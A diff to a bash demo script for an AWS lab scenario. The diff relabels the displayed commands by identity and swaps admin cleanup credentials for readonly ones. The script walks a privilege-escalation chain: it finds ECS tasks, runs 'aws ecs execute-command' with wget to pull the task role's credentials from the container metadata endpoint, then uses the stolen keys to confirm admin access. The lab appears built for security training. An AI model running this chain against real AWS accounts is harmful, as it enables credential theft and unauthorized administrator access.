@@ -22,14 +22,16 @@ CYAN='\033[0;36m'
 # Track attack commands for summary
 ATTACK_COMMANDS=()
 
-# Display a command before executing it
+# Display a non-attack command with identity context
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
-# Display AND record an attack command
+# Display AND record an attack command with identity context
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -93,12 +95,12 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
-# Retrieve admin cleanup credentials
-ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
-ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
 
-if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
-    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
     exit 1
 fi
 
@@ -126,9 +128,9 @@ use_starting_user_creds() {
     export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
     unset AWS_SESSION_TOKEN
 }
-use_admin_creds() {
-    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
-    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
     unset AWS_SESSION_TOKEN
 }
 
@@ -140,7 +142,7 @@ export AWS_REGION=$AWS_REGION
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -152,7 +154,7 @@ echo -e "${GREEN}Completed: Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}Completed: Retrieved account ID${NC}\n"
@@ -160,7 +162,7 @@ echo -e "${GREEN}Completed: Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}WARNING: Unexpectedly have admin permissions already${NC}"
 else
@@ -172,7 +174,7 @@ echo ""
 # Step 5: List tasks in the ECS cluster
 echo -e "${YELLOW}Step 5: Discovering ECS tasks in the cluster${NC}"
 echo "Cluster: $ECS_CLUSTER_NAME"
-use_admin_creds
+use_readonly_creds
 
 TASK_ARNS=$(aws ecs list-tasks \
     --region $AWS_REGION \
@@ -195,7 +197,7 @@ echo -e "${GREEN}Completed: Discovered running ECS task${NC}\n"
 # [OBSERVATION] Get task details to identify the admin role
 # Step 6: Get task details
 echo -e "${YELLOW}Step 6: Getting task details${NC}"
-show_attack_cmd "aws ecs describe-tasks --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --tasks $TASK_ARN --output json"
+show_attack_cmd "ReadOnly" "aws ecs describe-tasks --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --tasks $TASK_ARN --output json"
 TASK_INFO=$(aws ecs describe-tasks \
     --region $AWS_REGION \
     --cluster $ECS_CLUSTER_NAME \
@@ -279,7 +281,7 @@ echo ""
 # The AWS_CONTAINER_CREDENTIALS_RELATIVE_URI env var only exists inside the container
 # Use a temp file to capture output (works better with interactive SSM sessions)
 TEMP_OUTPUT_FILE=$(mktemp)
-show_attack_cmd "aws ecs execute-command --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --task $TASK_ARN --container $CONTAINER_NAME --interactive --command 'sh -c \"wget -qO- 169.254.170.2\\\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"'"
+show_attack_cmd "Attacker" "aws ecs execute-command --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --task $TASK_ARN --container $CONTAINER_NAME --interactive --command 'sh -c \"wget -qO- 169.254.170.2\\\$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"'"
 aws ecs execute-command \
     --region $AWS_REGION \
     --cluster $ECS_CLUSTER_NAME \
@@ -371,7 +373,7 @@ if [ -n "$STOLEN_ACCESS_KEY" ] && [ -n "$STOLEN_SECRET_KEY" ] && [ -n "$STOLEN_S
 
     # Verify identity
     echo "Verifying new identity..."
-    show_cmd "aws sts get-caller-identity --output json"
+    show_cmd "Attacker" "aws sts get-caller-identity --output json"
     NEW_IDENTITY=$(aws sts get-caller-identity --output json)
     echo "$NEW_IDENTITY" | jq .
 
@@ -385,7 +387,7 @@ if [ -n "$STOLEN_ACCESS_KEY" ] && [ -n "$STOLEN_SECRET_KEY" ] && [ -n "$STOLEN_S
     echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
     echo "Attempting to list IAM users..."
 
-    show_cmd "aws iam list-users --max-items 3 --output table --no-cli-pager"
+    show_cmd "Attacker" "aws iam list-users --max-items 3 --output table --no-cli-pager"
     if aws iam list-users --max-items 3 --output table --no-cli-pager; then
         echo -e "${GREEN}Completed: Successfully listed IAM users!${NC}"
         echo -e "${GREEN}ADMIN ACCESS CONFIRMED${NC}"
